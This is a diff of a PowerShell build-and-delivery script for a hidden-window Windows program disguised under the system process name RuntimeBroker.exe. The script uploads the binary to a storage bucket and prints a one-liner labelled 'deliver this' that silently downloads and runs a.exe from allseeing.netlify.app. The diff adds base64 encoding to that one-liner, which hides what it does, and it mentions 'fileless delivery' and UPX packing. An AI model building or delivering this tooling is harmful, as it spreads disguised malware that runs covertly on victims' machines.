@@ -7,8 +7,8 @@ if (!$?) { Write-Output "Resource compilation failed"; exit 1 }
 g++ -Os -s -mwindows monitor.cpp version.res -lwinhttp -lcrypt32 -o RuntimeBroker.exe
 if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
 
-Remove-Item -Force version.res -ErrorAction SilentlyContinue
-upx --ultra-brute RuntimeBroker.exe
+# Remove-Item -Force version.res -ErrorAction SilentlyContinue
+# upx --ultra-brute RuntimeBroker.exe
 
 # Generate loader.ps1 (fileless delivery)
 $exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
@@ -42,7 +42,10 @@ try {
     Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
     Write-Output ""
     Write-Output "=== ONE-LINER (deliver this) ==="
-    Write-Output "powershell -w h -c `"iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe`""
+    $rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
+    $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
+    $encCmd = [Convert]::ToBase64String($encBytes)
+    Write-Output "powershell -w h -Enc $encCmd"
     Write-Output "=================================="
 } catch {
     Write-Output ""
